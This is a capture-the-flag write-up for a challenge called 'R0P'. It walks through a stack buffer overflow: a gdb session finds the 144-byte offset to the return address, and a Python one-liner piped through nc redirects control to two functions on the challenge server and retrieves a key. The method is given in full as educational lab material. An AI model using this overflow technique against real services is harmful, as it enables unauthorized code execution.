## R0P [130]
## Solution
`call_first()` is at `0x08048671` and `call_second()` is at `0x080485BB`. In `vulnerable_function()` we read into a buffer on the stack until a newline is hit with no bounds checking. We can overflow the buffer and overwrite the return address on the `vulnerable_function()` stack to redirect it's control flow to `call_first()`. We will overwrite the return address of `vulnerable_function()` with `call_first()` and then write the address of `call_second()` directly after it to ensure that both functions are called.

```
ameise@STAHLKERN:~/CS2015/pwn/130_ROP$ gdb ./r0p 
Reading symbols from ./r0p...(no debugging symbols found)...done.
(gdb) disas vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x080486fc <+0>:	push   ebp
   0x080486fd <+1>:	mov    ebp,esp
   0x080486ff <+3>:	sub    esp,0x98
   [...]
   0x0804877b <+127>:	mov    eax,ds:0x804a068
   0x08048780 <+132>:	cmp    eax,0xff
   0x08048785 <+137>:	jle    0x804872a <vulnerable_function+46>
   0x08048787 <+139>:	leave  
   0x08048788 <+140>:	ret    
End of assembler dump.
(gdb) break *0x08048787
Breakpoint 1 at 0x8048787
(gdb) run
Starting program: /home/ameise/CS2015/pwn/130_ROP/r0p 
aaaabbbbccccdddd

Breakpoint 1, 0x08048787 in vulnerable_function ()
(gdb) p/x $ebp-0x8c
$1 = 0xffffce5c
(gdb) x/16xb 0xffffce5c
0xffffce5c:	0x61	0x61	0x61	0x61	0x62	0x62	0x62	0x62
0xffffce64:	0x63	0x63	0x63	0x63	0x64	0x64	0x64	0x64
(gdb) si
0x08048788 in vulnerable_function ()
(gdb) x/3i $eip
=> 0x8048788 <vulnerable_function+140>:	ret    
   0x8048789 <die>:	push   ebp
   0x804878a <die+1>:	mov    ebp,esp
(gdb) x/1xw $esp
0xffffceec:	0x08048870
```

The start of the buffer is at `0xffffce5c` and the return address is at `0xffffceec`. Thus, we need `0x90` (144) bytes of padding before overwriting the return addresses:
```
ameise@STAHLKERN:~/CS2015/pwn/130_ROP$ python -c 'print "a"*144 + "\x71\x86\x04\x08" + "\xbb\x85\x04\x08"' | nc shell.cyberstakesonline.com 20068
Loading first half of key...
Your key is: dfae35725f0fad799a74aed3e38d9a62
```